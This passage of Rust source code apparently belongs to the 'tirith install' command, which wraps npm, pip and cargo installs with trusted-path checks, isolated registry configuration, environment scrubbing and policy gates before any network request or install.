fn canonical_trusted_account_path(path: &Path, label: &str) -> std::io::Result<PathBuf> {
    validate_absolute_directory(path, label)?;
    let canonical = std::fs::canonicalize(path).map_err(|error| {
        std::io::Error::new(
            error.kind(),
            format!(
                "cannot canonicalize OS-derived {label} path {}: {error}",
                path.display()
            ),
        )
    })?;
    validate_absolute_directory(&canonical, label)?;
    ensure_trusted_install_directory(&canonical, label, &[])?;
    Ok(canonical)
}

fn validate_absolute_directory(path: &Path, label: &str) -> std::io::Result<PathBuf> {
    if path.as_os_str().is_empty() || !path.is_absolute() {
        return Err(std::io::Error::other(format!(
            "OS-derived {label} path is empty or relative"
        )));
    }
    if !std::fs::metadata(path)?.is_dir() {
        return Err(std::io::Error::other(format!(
            "OS-derived {label} path {} is not a directory",
            path.display()
        )));
    }
    Ok(path.to_path_buf())
}

#[cfg(unix)]
fn trusted_install_tempdir(base: &Path) -> std::io::Result<tempfile::TempDir> {
    use std::os::unix::fs::MetadataExt as _;

    let base = std::fs::canonicalize(base)?;
    let metadata = std::fs::metadata(&base)?;
    if !metadata.is_dir() {
        return Err(std::io::Error::other(format!(
            "trusted install temporary base {} is not a directory",
            base.display()
        )));
    }
    // SAFETY: geteuid has no preconditions and returns the process effective UID.
    let effective_uid = unsafe { libc::geteuid() };
    let mode = metadata.mode();
    let writable_by_others = mode & 0o022 != 0;
    let sticky = mode & 0o1000 != 0;
    if metadata.uid() != 0 && metadata.uid() != effective_uid {
        return Err(std::io::Error::other(format!(
            "trusted install temporary base {} has an unexpected owner",
            base.display()
        )));
    }
    if writable_by_others && !sticky {
        return Err(std::io::Error::other(format!(
            "trusted install temporary base {} is writable without the sticky bit",
            base.display()
        )));
    }
    tempfile::Builder::new()
        .prefix("tirith-install-runtime-")
        .tempdir_in(base)
}

#[cfg(windows)]
fn trusted_install_tempdir(base: &Path) -> std::io::Result<tempfile::TempDir> {
    tempfile::Builder::new()
        .prefix("tirith-install-runtime-")
        .tempdir_in(base)
}

#[cfg(windows)]
fn trusted_known_folder(folder: &windows::core::GUID, label: &str) -> std::io::Result<PathBuf> {
    use std::os::windows::ffi::OsStringExt as _;
    use windows::Win32::System::Com::CoTaskMemFree;
    use windows::Win32::UI::Shell::{SHGetKnownFolderPath, KF_FLAG_DEFAULT};

    // SAFETY: the folder ID is valid, the current-process token is requested,
    // and Windows owns the returned NUL-terminated allocation until it is freed.
    let raw = unsafe { SHGetKnownFolderPath(folder, KF_FLAG_DEFAULT, None) }
        .map_err(|error| std::io::Error::other(format!("cannot resolve {label}: {error}")))?;
    // SAFETY: SHGetKnownFolderPath returned a valid NUL-terminated allocation.
    let value = std::ffi::OsString::from_wide(unsafe { raw.as_wide() });
    // SAFETY: SHGetKnownFolderPath allocates with the COM task allocator and
    // transfers exactly one ownership reference to the caller.
    unsafe { CoTaskMemFree(Some(raw.as_ptr().cast())) };
    // Preserve the exact Win32 path spelling returned by the Known Folder API;
    // `std::fs::canonicalize` would add a `\\?\` prefix that some package
    // managers do not accept in HOME/APPDATA-style environment variables.
    validate_absolute_directory(Path::new(&value), label)
}

#[cfg(windows)]
fn trusted_windows_directories() -> std::io::Result<(PathBuf, PathBuf)> {
    use std::os::windows::ffi::OsStringExt as _;
    use windows::Win32::System::SystemInformation::{GetSystemDirectoryW, GetWindowsDirectoryW};

    fn resolve(
        getter: unsafe fn(Option<&mut [u16]>) -> u32,
        label: &str,
    ) -> std::io::Result<PathBuf> {
        let mut buffer = vec![0_u16; 32 * 1024];
        // SAFETY: the Win32 getter writes no more than the provided slice and
        // returns the number of UTF-16 code units excluding the trailing NUL.
        let length = unsafe { getter(Some(&mut buffer)) } as usize;
        if length == 0 || length >= buffer.len() {
            return Err(std::io::Error::other(format!(
                "cannot resolve the OS {label} directory"
            )));
        }
        validate_absolute_directory(
            Path::new(&std::ffi::OsString::from_wide(&buffer[..length])),
            label,
        )
    }

    Ok((
        resolve(GetWindowsDirectoryW, "Windows")?,
        resolve(GetSystemDirectoryW, "system")?,
    ))
}

/// Source-selection state approved together with one install plan. npm and pip
/// receive explicit official-registry configuration and disposable caches;
/// cargo registry installs additionally run outside the project configuration
/// tree. Project config paths that can still affect npm/cargo are fingerprinted
/// (including absence) and revalidated immediately before spawn.
#[derive(Debug)]
struct InstallSourceBinding {
    manager: PackageManager,
    source_configs: Vec<CapturedSourceConfig>,
    isolated: Option<tempfile::TempDir>,
    // Declared after `isolated` so the nested source directory is removed
    // before its parent private runtime directory during normal field drop.
    execution_environment: Option<TrustedInstallEnvironment>,
    configuration_issue: Option<String>,
    npm_project_manifest_gap: Option<InstallCoverageGap>,
    npm_scopes: Vec<String>,
    cargo_isolated_cwd: bool,
    cargo_install_root: Option<OsString>,
}

impl InstallSourceBinding {
    #[cfg(test)]
    fn capture(
        manager: PackageManager,
        cwd: Option<&Path>,
        args: &[String],
    ) -> std::io::Result<Self> {
        Self::capture_inner(manager, cwd, args, true, None)
    }

    fn capture_for_execution(
        manager: PackageManager,
        cwd: Option<&Path>,
        args: &[String],
        executable: &InstallExecutableBinding,
    ) -> std::io::Result<Self> {
        Self::capture_inner(manager, cwd, args, true, Some(executable))
    }

    fn capture_analysis_only(
        manager: PackageManager,
        cwd: Option<&Path>,
        args: &[String],
    ) -> std::io::Result<Self> {
        Self::capture_inner(manager, cwd, args, false, None)
    }

    fn capture_inner(
        manager: PackageManager,
        cwd: Option<&Path>,
        args: &[String],
        bind_execution: bool,
        executable: Option<&InstallExecutableBinding>,
    ) -> std::io::Result<Self> {
        let execution_environment = bind_execution
            .then(|| TrustedInstallEnvironment::capture(executable))
            .transpose()?;
        let mut candidate_paths = match manager {
            PackageManager::Npm => {
                let mut paths = configuration_candidates(cwd, Path::new(".npmrc"));
                paths.extend(configuration_candidates(cwd, Path::new("package.json")));
                for prefix in npm_prefix_roots(args, cwd) {
                    paths.extend(configuration_candidates_for_path(
                        &prefix,
                        Path::new(".npmrc"),
                    ));
                    paths.extend(configuration_candidates_for_path(
                        &prefix,
                        Path::new("package.json"),
                    ));
                }
                paths
            }
            PackageManager::Cargo => {
                let mut paths = configuration_candidates(cwd, Path::new(".cargo/config.toml"));
                paths.extend(configuration_candidates(cwd, Path::new(".cargo/config")));
                paths
            }
            _ => Vec::new(),
        };
        candidate_paths.sort();
        candidate_paths.dedup();

        let mut source_configs = Vec::with_capacity(candidate_paths.len().saturating_add(3));
        let mut configuration_issue = None;
        let mut npm_project_manifest_gap = None;
        let mut npm_scopes = Vec::new();
        for path in candidate_paths {
            let path_label = path.display().to_string();
            let is_npm_config =
                manager == PackageManager::Npm && path.file_name() == Some(OsStr::new(".npmrc"));
            let is_npm_manifest = manager == PackageManager::Npm
                && path.file_name() == Some(OsStr::new("package.json"));
            let (snapshot, content) = CapturedSourceConfig::capture(path)?;
            if configuration_issue.is_none() {
                configuration_issue = content
                    .as_deref()
                    .and_then(|content| match manager {
                        PackageManager::Npm if is_npm_config => npm_config_source_issue(content),
                        PackageManager::Cargo => cargo_config_source_issue(content),
                        _ => None,
                    })
                    .map(|reason| format!("{path_label}: {reason}"));
            }
            if is_npm_config {
                if let Some(content) = content.as_deref() {
                    npm_scopes.extend(npm_registry_scopes(content));
                }
            }
            if npm_project_manifest_gap.is_none() && is_npm_manifest {
                if let Some(content) = content.as_deref() {
                    npm_project_manifest_gap =
                        install_txn::captured_npm_project_manifest_coverage_gap(
                            &snapshot.requested_path,
                            content,
                            args,
                        );
                }
            }
            source_configs.push(snapshot);
        }

        let isolated = match (manager, execution_environment.as_ref()) {
            (PackageManager::Npm | PackageManager::Cargo, Some(environment)) => {
                let directory = tempfile::Builder::new()
                    .prefix("tirith-install-source-")
                    .tempdir_in(environment.private_temp.path())?;
                if manager == PackageManager::Npm {
                    std::fs::write(
                        directory.path().join("npm-user.npmrc"),
                        "registry=https://registry.npmjs.org/\npackage-lock=false\n",
                    )?;
                    std::fs::write(
                        directory.path().join("npm-global.npmrc"),
                        "registry=https://registry.npmjs.org/\n",
                    )?;
                    // These disposable files are source-affecting inputs too.
                    // Bind their identity so a same-user replacement between
                    // analysis and spawn is rejected like project config drift.
                    for name in ["npm-user.npmrc", "npm-global.npmrc"] {
                        let (snapshot, _) =
                            CapturedSourceConfig::capture(directory.path().join(name))?;
                        source_configs.push(snapshot);
                    }
                } else {
                    std::fs::create_dir(directory.path().join("cargo-home"))?;
                    std::fs::create_dir(directory.path().join("cargo-work"))?;
                }
                Some(directory)
            }
            _ => None,
        };

        npm_scopes.extend(args.iter().filter_map(|argument| {
            let slash = argument.strip_prefix('@')?.find('/')?;
            let scope = &argument[..slash.saturating_add(1)];
            (!scope.is_empty()).then(|| scope.to_ascii_lowercase())
        }));
        npm_scopes.sort();
        npm_scopes.dedup();

        let cargo_isolated_cwd = bind_execution
            && manager == PackageManager::Cargo
            && !cargo_args_require_original_cwd(args);
        let cargo_install_root = if manager == PackageManager::Cargo {
            execution_environment
                .as_ref()
                .map(|environment| environment.account_home.join(".cargo").into_os_string())
        } else {
            None
        };

        Ok(Self {
            manager,
            execution_environment,
            source_configs,
            isolated,
            configuration_issue,
            npm_project_manifest_gap,
            npm_scopes,
            cargo_isolated_cwd,
            cargo_install_root,
        })
    }

    fn configuration_issue(&self) -> Option<&str> {
        self.configuration_issue.as_deref()
    }

    fn npm_project_manifest_gap(&self) -> Option<&InstallCoverageGap> {
        self.npm_project_manifest_gap.as_ref()
    }

    fn verify(&self) -> std::io::Result<()> {
        for config in &self.source_configs {
            config.verify()?;
        }
        Ok(())
    }

    fn configure_command(&self, command: &mut Command) {
        // The package-manager executable is content-bound immediately before
        // spawn, but loaders, interpreters, and build tools inspect arbitrary
        // environment variables before or during an install. Start empty and
        // re-add only operational values whose semantics are intentionally
        // supported; a denylist cannot enumerate future build-tool hooks.
        let trusted = self
            .execution_environment
            .as_ref()
            .expect("a real install runner must own a bound execution environment");
        configure_minimal_execution_environment(command, trusted);
        if matches!(
            self.manager,
            PackageManager::Npm | PackageManager::Pip | PackageManager::Cargo
        ) {
            remove_matching_environment(command, is_transport_override_environment);
        }
        match self.manager {
            PackageManager::Npm => {
                let isolated = self
                    .isolated
                    .as_ref()
                    .expect("npm source binding must own disposable configuration");
                remove_matching_environment(command, is_npm_runtime_override_environment);
                command
                    .env("NPM_CONFIG_REGISTRY", "https://registry.npmjs.org/")
                    .env(
                        "NPM_CONFIG_USERCONFIG",
                        isolated.path().join("npm-user.npmrc"),
                    )
                    .env(
                        "NPM_CONFIG_GLOBALCONFIG",
                        isolated.path().join("npm-global.npmrc"),
                    )
                    .env("NPM_CONFIG_CACHE", isolated.path().join("npm-cache"))
                    .env("NPM_CONFIG_PACKAGE_LOCK", "false")
                    .env("NPM_CONFIG_SHRINKWRAP", "false")
                    .env("NPM_CONFIG_OFFLINE", "false")
                    .env("NPM_CONFIG_PREFER_ONLINE", "true");
                for scope in &self.npm_scopes {
                    command.env(
                        format!("npm_config_{scope}:registry"),
                        "https://registry.npmjs.org/",
                    );
                }
            }
            PackageManager::Pip => {
                remove_matching_environment(command, |name| {
                    os_name_starts_with_ignore_ascii_case(name, "pip_")
                });
                command
                    // pip treats PIP_CONFIG_FILE=os.devnull as an explicit
                    // request to skip global, user, and site configuration.
                    // This prevents additive settings such as
                    // extra-index-url from surviving beneath our official
                    // index environment binding.
                    .env("PIP_CONFIG_FILE", null_device_path())
                    .env("PIP_INDEX_URL", "https://pypi.org/simple")
                    .env("PIP_NO_INDEX", "false")
                    .env("PIP_NO_CACHE_DIR", "true")
                    .env("PIP_DISABLE_PIP_VERSION_CHECK", "true");
            }
            PackageManager::Cargo => {
                let isolated = self
                    .isolated
                    .as_ref()
                    .expect("cargo source binding must own a disposable home");
                scrub_cargo_runtime_environment(command);
                remove_matching_environment(command, |name| {
                    os_name_starts_with_ignore_ascii_case(name, "cargo_registry_")
                        || os_name_starts_with_ignore_ascii_case(name, "cargo_registries_")
                        || os_name_starts_with_ignore_ascii_case(name, "cargo_source_")
                        || os_name_eq_ignore_ascii_case(name, "cargo_home")
                });
                command
                    .env("CARGO_HOME", isolated.path().join("cargo-home"))
                    .env("CARGO_REGISTRY_DEFAULT", "crates-io")
                    .env(
                        "CARGO_REGISTRIES_CRATES_IO_INDEX",
                        "sparse+https://index.crates.io/",
                    );
                if let Some(root) = &self.cargo_install_root {
                    command.env("CARGO_INSTALL_ROOT", root);
                }
                if self.cargo_isolated_cwd {
                    command.current_dir(isolated.path().join("cargo-work"));
                }
            }
            _ => {}
        }
    }
}

fn configure_minimal_execution_environment(
    command: &mut Command,
    trusted: &TrustedInstallEnvironment,
) {
    // The exact environment snapshot was captured before approval. Do not
    // reread PATH, locale, profile, temp, or Windows selector variables here:
    // all command configuration after this point uses the bound snapshot.
    trusted.apply(command);

    // CPython can otherwise import a user-site `sitecustomize.py` before pip's
    // own configuration is evaluated. Unknown PYTHON* switches are ignored by
    // older interpreters, so these are safe defense-in-depth across versions.
    command
        .env("PYTHONNOUSERSITE", "1")
        .env("PYTHONSAFEPATH", "1");
}

fn remove_matching_environment(command: &mut Command, predicate: impl Fn(&OsStr) -> bool) {
    let explicit_names = command
        .get_envs()
        .filter_map(|(name, _)| predicate(name).then_some(name.to_os_string()))
        .collect::<Vec<_>>();
    for name in explicit_names {
        command.env_remove(name);
    }
}

fn scrub_cargo_runtime_environment(command: &mut Command) {
    const EXACT_OVERRIDES: &[&str] = &[
        "RUSTC",
        "RUSTDOC",
        "RUSTC_WRAPPER",
        "RUSTC_WORKSPACE_WRAPPER",
        "RUSTFLAGS",
        "RUSTDOCFLAGS",
        "CARGO_ENCODED_RUSTFLAGS",
        "CARGO_ENCODED_RUSTDOCFLAGS",
    ];

    // Record deterministic removals even when a variable is absent from this
    // process. Lowercase spellings matter on case-insensitive platforms and
    // also make the intended boundary explicit in command-level tests.
    for name in EXACT_OVERRIDES {
        command.env_remove(name);
        command.env_remove(name.to_ascii_lowercase());
    }
    remove_matching_environment(command, is_cargo_runtime_override_environment);
}

fn os_name_starts_with_ignore_ascii_case(name: &OsStr, prefix: &str) -> bool {
    name.to_str()
        .and_then(|name| name.get(..prefix.len()))
        .is_some_and(|head| head.eq_ignore_ascii_case(prefix))
}

fn os_name_eq_ignore_ascii_case(name: &OsStr, expected: &str) -> bool {
    name.to_str()
        .is_some_and(|name| name.eq_ignore_ascii_case(expected))
}

fn is_npm_runtime_override_environment(name: &OsStr) -> bool {
    os_name_starts_with_ignore_ascii_case(name, "npm_config_")
        || os_name_eq_ignore_ascii_case(name, "node_options")
        || os_name_eq_ignore_ascii_case(name, "node_path")
}

fn is_cargo_runtime_override_environment(name: &OsStr) -> bool {
    let Some(name) = name.to_str() else {
        return false;
    };
    let upper = name.to_ascii_uppercase();
    upper.starts_with("CARGO_BUILD_")
        || upper.starts_with("CARGO_TARGET_")
        || upper.starts_with("RUSTUP_")
        || matches!(
            upper.as_str(),
            "RUSTC"
                | "RUSTDOC"
                | "RUSTC_WRAPPER"
                | "RUSTC_WORKSPACE_WRAPPER"
                | "RUSTFLAGS"
                | "RUSTDOCFLAGS"
                | "CARGO_ENCODED_RUSTFLAGS"
                | "CARGO_ENCODED_RUSTDOCFLAGS"
        )
}

fn is_transport_override_environment(name: &OsStr) -> bool {
    let Some(name) = name.to_str() else {
        return false;
    };
    let upper = name.to_ascii_uppercase();
    upper.starts_with("CARGO_HTTP_")
        || matches!(
            upper.as_str(),
            "HTTP_PROXY"
                | "HTTPS_PROXY"
                | "ALL_PROXY"
                | "NO_PROXY"
                | "SSL_CERT_FILE"
                | "SSL_CERT_DIR"
                | "REQUESTS_CA_BUNDLE"
                | "CURL_CA_BUNDLE"
                | "NODE_EXTRA_CA_CERTS"
                | "NODE_TLS_REJECT_UNAUTHORIZED"
        )
}

fn null_device_path() -> &'static str {
    if cfg!(windows) {
        // pip compares PIP_CONFIG_FILE byte-for-byte with Python's
        // `os.devnull` sentinel before deciding to skip every config file.
        // CPython reports lowercase `nul` on Windows; `NUL` opens the same
        // device but does not trigger pip's case-sensitive sentinel branch.
        "nul"
    } else {
        "/dev/null"
    }
}

fn npm_registry_scopes(content: &str) -> Vec<String> {
    content
        .strip_prefix('\u{feff}')
        .unwrap_or(content)
        .lines()
        .filter_map(|line| {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
                return None;
            }
            let (key, _) = line.split_once('=')?;
            let key = npm_ini_normalize_key(key);
            let scope = key.strip_suffix(":registry")?.to_string();
            (scope.starts_with('@') && scope.len() > 1).then_some(scope)
        })
        .collect()
}

fn npm_prefix_roots(args: &[String], cwd: Option<&Path>) -> Vec<PathBuf> {
    let base = cwd
        .map(Path::to_path_buf)
        .or_else(|| std::env::current_dir().ok());
    let mut roots = Vec::new();
    let mut index = 0;
    while index < args.len() {
        let value = if args[index] == "--prefix" {
            index = index.saturating_add(1);
            args.get(index).map(String::as_str)
        } else {
            args[index].strip_prefix("--prefix=")
        };
        if let Some(value) = value.filter(|value| !value.is_empty()) {
            let path = PathBuf::from(value);
            roots.push(if path.is_absolute() {
                path
            } else if let Some(base) = &base {
                base.join(path)
            } else {
                path
            });
        }
        index = index.saturating_add(1);
    }
    roots
}

fn cargo_args_require_original_cwd(args: &[String]) -> bool {
    // Relative output-only paths are absolutized before this decision, so they
    // do not need access to project configuration. Only input-bearing forms
    // retain cwd, and both are explicit coverage gaps in the core planner.
    const PATH_FLAGS: &[&str] = &["--path", "--config"];
    args.iter().any(|argument| {
        PATH_FLAGS.contains(&argument.as_str())
            || PATH_FLAGS
                .iter()
                .any(|flag| argument.starts_with(&format!("{flag}=")))
    })
}

fn bind_cargo_output_paths(args: &[String], cwd: &Path) -> Result<Vec<String>, String> {
    const OUTPUT_FLAGS: &[&str] = &["--root", "--target-dir"];

    let mut bound = Vec::with_capacity(args.len());
    let mut index = 0;
    while index < args.len() {
        let argument = &args[index];
        if argument == "--" {
            bound.extend(args[index..].iter().cloned());
            break;
        }
        if OUTPUT_FLAGS.contains(&argument.as_str()) {
            bound.push(argument.clone());
            if let Some(value) = args.get(index.saturating_add(1)) {
                bound.push(bind_cargo_output_path_value(argument, value, cwd)?);
                index = index.saturating_add(2);
            } else {
                // Preserve the missing value so the core coverage parser emits
                // its typed MissingArgumentValue gap.
                index = index.saturating_add(1);
            }
            continue;
        }
        if let Some((flag, value)) = argument.split_once('=') {
            if OUTPUT_FLAGS.contains(&flag) {
                let value = bind_cargo_output_path_value(flag, value, cwd)?;
                bound.push(format!("{flag}={value}"));
                index = index.saturating_add(1);
                continue;
            }
        }
        bound.push(argument.clone());
        index = index.saturating_add(1);
    }
    Ok(bound)
}

fn bind_cargo_output_path_value(flag: &str, value: &str, cwd: &Path) -> Result<String, String> {
    if value.is_empty() {
        return Ok(String::new());
    }
    let value_path = Path::new(value);
    let bound = if value_path.is_absolute() {
        value_path.to_path_buf()
    } else {
        cwd.join(value_path)
    };
    bound.into_os_string().into_string().map_err(|_| {
        format!(
            "{flag} cannot be safely bound to the current directory because the absolute path is not valid UTF-8"
        )
    })
}

/// Entry point for `tirith install`. `source` selects the install kind; `args`
/// are the package list / flags (or the URL for the `url` form).
#[allow(clippy::too_many_arguments)]
pub fn run(
    source: InstallSource,
    args: &[String],
    online: bool,
    offline: bool,
    json: bool,
    yes: bool,
    no_exec: bool,
    sha256: Option<String>,
) -> i32 {
    // A tirith-owned flag placed AFTER <source> lands in the package-manager args
    // (trailing_var_arg), not parsed by tirith — a safety footgun (e.g. a
    // misplaced `--no-exec` would STILL run the real install). Guarded flags are
    // tirith-owned options no package manager interprets, so finding one trailing
    // is a hard error. `--offline`/`--format`/`--json` are NOT guarded (legitimate
    // package-manager flags).
    const MISPLACED_TIRITH_FLAGS: &[&str] = &["--no-exec", "--online", "--yes"];
    if let Some(flag) = args
        .iter()
        .find(|a| MISPLACED_TIRITH_FLAGS.contains(&a.as_str()))
    {
        eprintln!(
            "tirith install: `{flag}` is a tirith option and must come before \
             the <source> argument (e.g. `tirith install {flag} npm \
             <package>`). After <source>, arguments go to the package manager \
             — a misplaced `{flag}` would not affect tirith."
        );
        return 2;
    }
    match source.package_manager() {
        Some(manager) => run_package_manager(manager, args, online, offline, json, yes, no_exec),
        None => run_url(args, online, offline, json, no_exec, sha256),
    }
}

// package-manager form: npm / pip / cargo

/// C12: evaluate an owned `tirith install` transition.
///
/// The envelope carries the manager argv as a shell action so the Web3 grammar
/// still contributes what it can derive; `boundary_effects` states what the
/// TRANSITION itself does, which the argv grammar cannot tell you. Both feed one
/// [`tirith_core::task::decide`]; nothing here re-implements effect inference.
///
/// The two transitions deliberately carry DIFFERENT effects. Analysis reaches a
/// registry and nothing else: it installs nothing and writes nothing, so
/// claiming an install effect there would refuse a read-only operation. The
/// spawn is where the package is actually installed onto the disk. An operator
/// who denies only `package_install` therefore keeps their analysis and loses
/// the execution, which is the useful posture and would be unreachable if both
/// gates asked the same question.
fn evaluate_install_boundary(
    boundary: tirith_core::task_boundary::OwnedBoundary,
    manager: PackageManager,
    args: &[String],
    policy: &tirith_core::policy::Policy,
    boundary_effects: &[tirith_core::effects::CommandEffectKind],
) -> tirith_core::task_boundary::BoundaryAssessment {
    let command = format!("{} {}", manager.program(), args.join(" "));
    let envelope = tirith_core::task_boundary::shell_envelope(&command);
    let operation = tirith_core::task_boundary::BoundaryOperation {
        boundary,
        envelope: &envelope,
        adapter: tirith_core::task::IngressAdapter::Unattributed,
        boundary_effects: boundary_effects.iter().copied().collect(),
    };
    tirith_core::task_boundary::evaluate(&operation, &policy.task_gate)
}

/// Report a pre-analysis task-gate refusal. `before` names the irreversible step
/// that did not happen, in the caller's own words, because the two forms of
/// `tirith install` reach different ones.
///
/// Written to stderr even under `--json`, matching every other refusal that
/// happens before a plan exists (an empty argv, an unresolvable executable): the
/// stdout envelope is `{"analysis":..,"outcome":..}` and there is no analysis to
/// put in it yet.
fn report_install_task_refusal(
    assessment: &tirith_core::task_boundary::BoundaryAssessment,
    before: &str,
    reason: &str,
    compiled: &tirith_core::redact::CompiledCustomPatterns,
) -> i32 {
    eprintln!(
        "tirith install: task gate refused at the {} boundary before {}: {}",
        assessment.boundary.token(),
        before,
        tirith_core::output::sanitize_human_field_with_compiled(reason, compiled),
    );
    1
}

#[allow(clippy::too_many_arguments)]
fn run_package_manager(
    manager: PackageManager,
    args: &[String],
    online: bool,
    offline: bool,
    json: bool,
    yes: bool,
    no_exec: bool,
) -> i32 {
    if args.is_empty() {
        eprintln!(
            "tirith install: no packages or arguments given for {}.",
            manager.label()
        );
        eprintln!(
            "  try: tirith install {} <package>   (e.g. tirith install {} {})",
            manager.label(),
            manager.label(),
            example_package(manager),
        );
        return 2;
    }

    // Select and fingerprint the executable before any approval is produced.
    // `--no-exec` remains a portable analysis-only operation and therefore
    // does not require the package manager to be installed on this host.
    let executable_binding = if no_exec
        || (manager.is_windows_only_runtime() && !cfg!(target_os = "windows"))
    {
        None
    } else {
        match InstallExecutableBinding::resolve(manager.program()) {
            Ok(binding) => Some(binding),
            Err(error) => {
                eprintln!(
                    "tirith install: refusing to analyze-and-run an untrusted or unresolved '{}' executable: {}",
                    manager.program(),
                    install_value_for_human(&error.to_string()),
                );
                return 2;
            }
        }
    };

    let interactive = is_terminal::is_terminal(std::io::stderr());
    let cwd_path = match std::env::current_dir() {
        Ok(path) => path,
        Err(error) => {
            eprintln!(
                "tirith install: refusing to continue without a stable current directory for source and manifest coverage: {}",
                install_value_for_human(&error.to_string()),
            );
            return 2;
        }
    };
    // Keep the OS-native path for every security-sensitive source/config and
    // manifest lookup. The display string is only for policy/engine output;
    // lossy UTF-8 conversion must never select what npm bytes are inspected.
    let cwd = Some(cwd_path.display().to_string());
    let effective_args = if manager == PackageManager::Cargo {
        match bind_cargo_output_paths(args, &cwd_path) {
            Ok(args) => args,
            Err(error) => {
                eprintln!(
                    "tirith install: refusing to continue without stable Cargo output paths: {}",
                    install_value_for_human(&error.to_string()),
                );
                return 2;
            }
        }
    } else {
        args.to_vec()
    };
    let args = effective_args.as_slice();
    let _policy_diagnostic_capture = tirith_core::policy::PolicyDiagnosticCapture::start();
    let policy = Policy::discover(cwd.as_deref());
    tirith_core::policy::freeze_captured_policy_dlp_patterns(&policy.dlp_custom_patterns);
    let output_dlp =
        tirith_core::redact::CompiledCustomPatterns::new_silent(&policy.dlp_custom_patterns);
    if !json {
        emit_install_policy_diagnostics_human(&output_dlp);
    }
    let source_binding_result = match executable_binding.as_ref() {
        Some(executable) => {
            InstallSourceBinding::capture_for_execution(manager, Some(&cwd_path), args, executable)
        }
        None => InstallSourceBinding::capture_analysis_only(manager, Some(&cwd_path), args),
    };
    let source_binding = match source_binding_result {
        Ok(binding) => binding,
        Err(error) => {
            eprintln!(
                "tirith install: refusing to analyze-and-run without a stable {} source configuration: {}",
                manager.label(),
                install_value_for_human(&error.to_string()),
            );
            return 2;
        }
    };

    // C12: the owned network-egress transition for the analysis path. Every
    // registry lookup below flows from `use_online` / `HttpRegistryClient` /
    // `gather_api_signals_exact`, so the gate sits above all three: a refusal
    // here means no host was contacted.
    //
    // The only effect analysis has is network egress: it resolves registry
    // metadata, installs nothing, and writes nothing. The install and write
    // effects belong to the spawn gate further down, not here.
    let network_assessment = evaluate_install_boundary(
        tirith_core::task_boundary::OwnedBoundary::PackageManagerNetwork,
        manager,
        args,
        &policy,
        &[tirith_core::effects::CommandEffectKind::NetworkEgress],
    );
    if let Some(reason) = network_assessment.refusal(false) {
        return report_install_task_refusal(
            &network_assessment,
            "any registry request",
            reason,
            &output_dlp,
        );
    }

    // --- ANALYZE ---
    // Offline by default; `--online` opts in, `--offline` / `TIRITH_OFFLINE`
    // overrides it. The resolver degrades any registry failure to `Unavailable`.
    let use_online = online && !offline && !super::offline_env_active();
    let http_client = HttpRegistryClient::new();
    // Source ambiguity is a transaction property, not an online-resolver
    // property. Detect it even for the default offline analysis so strict
    // policy never mistakes ambient/custom bytes for official provenance.
    let registry_configuration_issue = source_binding
        .configuration_issue()
        .map(str::to_owned)
        .or_else(|| detect_registry_configuration_issue(manager, Some(&cwd_path)));
    // M6 ch6 — fold `PackageExistence` into the provenance so the
    // `PackageNotFoundInRegistry` gate can read it; an `Unavailable` with a
    // positive 404 is upgraded to `Available` carrying only existence.
    let resolver = |eco: Ecosystem, name: &str, version: &str| {
        let (mut signals, existence) =
            registry_api::gather_api_signals_exact(&http_client, eco, name, version);
        use tirith_core::package_risk::{ApiProvenance, PackageExistence};
        match &mut signals {
            tirith_core::package_risk::ApiSignals::Available { provenance } => {
                provenance.package_existence = existence;
                let dc = tirith_core::dep_confusion::evaluate(eco, name, &policy);
                if dc.risk {
                    provenance.dep_confusion = Some(dc);
                }
            }
            tirith_core::package_risk::ApiSignals::Unavailable { .. }
                if matches!(existence, PackageExistence::NotFound) =>
            {
                let mut prov = ApiProvenance {
                    source: eco.to_string(),
                    package_name: Some(name.to_string()),
                    package_existence: PackageExistence::NotFound,
                    ..Default::default()
                };
                let dc = tirith_core::dep_confusion::evaluate(eco, name, &policy);
                if dc.risk {
                    prov.dep_confusion = Some(dc);
                }
                signals = tirith_core::package_risk::ApiSignals::Available { provenance: prov };
            }
            _ => {}
        }
        signals
    };
    // C13: the name-existence seam. The exact resolver above cannot answer for
    // an unpinned spec, because there is no version to bind provenance to. This
    // one answers only whether the registry claims the name exists, so a
    // plausible-looking but nonexistent package is rejected even when the
    // install is unpinned. It returns `PackageExistence` and nothing else, so
    // it structurally cannot leak latest-version provenance onto an unpinned
    // install.
    let name_existence = |eco: Ecosystem, name: &str| {
        let (_signals, existence) = registry_api::gather_api_signals(&http_client, eco, name);
        existence
    };
    let online_mode = if let Some(reason) = registry_configuration_issue.as_deref() {
        OnlineMode::UnverifiedSource(reason)
    } else if !use_online {
        OnlineMode::Off
    } else {
        OnlineMode::Resolver {
            exact: &resolver,
            name_only: &name_existence,
        }
    };

    let db = ThreatDb::cached();
    let plan_request = PlanRequest {
        manager,
        user_args: args,
        db: db.as_deref(),
        policy: &policy,
        cwd: cwd.clone(),
        interactive,
        online: online_mode,
    };
    let mut plan = install_txn::plan_install_with_captured_npm_manifest(
        &plan_request,
        source_binding.npm_project_manifest_gap(),
    );
    if let Some(binding) = &executable_binding {
        plan.argv.program = binding.path().display().to_string();
        plan.analysis_command = plan.argv.display();
        plan.notes.push(format!(
            "package-manager executable bound to {} (sha256={})",
            binding.path().display(),
            binding.sha256_hex(),
        ));
    }
    if matches!(
        manager,
        PackageManager::Npm | PackageManager::Pip | PackageManager::Cargo
    ) {
        plan.notes.push(format!(
            "{} ambient source state bound to sanitized official-registry settings; explicit source-changing arguments remain coverage-gated and relevant project configuration is fingerprinted until spawn",
            manager.label()
        ));
    }

    // M4 item 8 chunk 3 — stamp the caller origin before the audit write (the
    // engine doesn't know the caller's identity; the CLI does), else audit lines
    // land in the "unknown" bucket.
    plan.verdict.agent_origin = Some(tirith_core::agent_origin::resolve_cli_origin(interactive));

    // M4 item 8 chunk 3 — enforce `agent_rules.deny` on the install path, which
    // doesn't route through `post_process_verdict` (no-op on Allowed/Unspecified).
    // M4 PR #120 fix-6 (Greptile P1): mirror the bypass-skip — under `TIRITH=0`
    // the raw verdict wins and we must NOT re-Block. Pinned by
    // `install_agent_rules_deny_skipped_under_tirith_bypass_today`.
    if !plan.verdict.bypass_honored {
        tirith_core::escalation::apply_agent_rules(&mut plan.verdict, &policy);
    }

    // --- INFORM ---
    // PR #121 fix-list item 3 — JSON analysis is NOT written here; it's held so
    // analysis + outcome ship as ONE envelope `{"analysis":..,"outcome":..}`.
    // Writing it here let the child's stdout interleave between two JSON objects.
    if !json {
        print_plan_human(&plan, use_online, &output_dlp);
    }

    // Decide the gate BEFORE the audit write so a `TIRITH=0`-bypassed BLOCK is
